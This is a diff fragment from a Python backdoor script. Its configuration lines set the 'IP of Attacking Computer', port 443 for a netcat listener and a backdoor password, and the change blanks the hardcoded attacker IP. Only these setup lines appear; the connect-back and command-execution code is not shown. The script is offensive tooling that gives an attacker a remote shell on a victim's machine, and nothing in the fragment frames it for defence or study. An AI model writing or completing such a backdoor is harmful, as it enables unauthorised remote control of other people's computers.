@@ -2,7 +2,7 @@
 import subprocess  #process commands
 import socket      #process socket Data
 
-host = "192.168.55.104"  #IP of Attacking Computer
+host = "         "  #IP of Attacking Computer
 port = 443              #port of Attacking Computer will listen on use netcat for the Listener
 passwd = "backdoor"     #password for your Backdoor
 
